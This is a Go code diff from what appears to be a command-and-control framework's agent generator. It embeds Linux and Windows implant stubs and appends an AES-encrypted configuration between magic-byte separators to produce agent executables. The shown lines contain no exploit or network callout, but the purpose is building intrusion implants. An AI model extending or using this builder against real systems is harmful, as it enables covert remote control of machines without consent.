@@ -1,7 +1,7 @@
 package cc
 
 import (
-	"encoding/base64"
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -26,8 +26,8 @@ const (
 
 func GenAgent() {
 	now := time.Now()
-	stubFile := EmpBuildDir + "/stub.exe"
-	outfile := fmt.Sprintf("%s/agent_%d-%d-%d_%d-%d-%d.exe",
+	stubFile := emp3r0r_data.Stub_Linux
+	outfile := fmt.Sprintf("%s/agent_linux_%d-%d-%d_%d-%d-%d.exe",
 		EmpWorkSpace,
 		now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 
@@ -35,7 +35,7 @@ func GenAgent() {
 	is_win := os_choice == "2"
 	is_linux := os_choice == "1"
 	if is_win {
-		stubFile = EmpBuildDir + "/stub-win.exe"
+		stubFile = emp3r0r_data.Stub_Windows
 		outfile = fmt.Sprintf("%s/agent_windows_%d-%d-%d_%d-%d-%d.exe",
 			EmpWorkSpace,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
@@ -62,15 +62,12 @@ func GenAgent() {
 	}
 
 	// encrypt
-	key := tun.GenAESKey(emp3r0r_data.MagicString)
+	key := tun.GenAESKey(string(emp3r0r_data.OneTimeMagicBytes))
 	encryptedJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
 	if encryptedJSONBytes == nil {
 		CliPrintError("Failed to encrypt %s with key %s", EmpConfigFile, key)
 		return
 	}
-
-	// base64
-	json_data_to_write := base64.StdEncoding.EncodeToString(encryptedJSONBytes)
 
 	// write
 	toWrite, err := ioutil.ReadFile(stubFile)
@@ -78,11 +75,11 @@ func GenAgent() {
 		CliPrintError("Read stub: %v", err)
 		return
 	}
-	sep := []byte(strings.Repeat(emp3r0r_data.MagicString, 3))
+	sep := bytes.Repeat(emp3r0r_data.OneTimeMagicBytes, 3)
 
 	// wrap the config data with magic string
 	toWrite = append(toWrite, sep...)
-	toWrite = append(toWrite, []byte(json_data_to_write)...)
+	toWrite = append(toWrite, encryptedJSONBytes...)
 	toWrite = append(toWrite, sep...)
 	err = ioutil.WriteFile(outfile, toWrite, 0755)
 	if err != nil {
